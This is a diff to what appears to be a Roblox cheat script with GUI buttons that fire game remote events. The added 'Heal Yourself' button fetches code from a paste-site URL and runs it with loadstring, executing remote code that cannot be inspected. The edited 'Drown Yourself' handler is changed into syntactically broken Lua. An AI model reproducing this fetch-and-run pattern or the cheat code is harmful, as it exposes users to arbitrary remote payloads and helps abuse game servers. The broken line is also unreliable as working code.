@@ -70,6 +70,10 @@ MainSection:NewButton("Drown Cat {Coming Soon!}", "Befriending Cat", function()
         
 end)
 
+MainSection:NewButton("Heal Yourself", "Healing YourSelf!", function()
+        loadstring(game:HttpGet("https://controlc.com/236e54ed"))()
+end)
+
 
 
 
@@ -147,7 +151,7 @@ PlayerSection:NewSlider("Walkspeed", "Changes the walkspeed", 250, 16, function(
 
 PlayerSection:NewButton("Drown Yourself", "Drowing Yourself", function()
         local A_1 = 1
-        local A_2 = game:GetService("Players").YourNameHere
+        local A_2 = game:GetService("Players")."..Player.Name..".",
         local Event = game:GetService("ReplicatedStorage").RemoteEvents.ToxicDrown
         Event:FireServer(A_1, A_2)
 end)
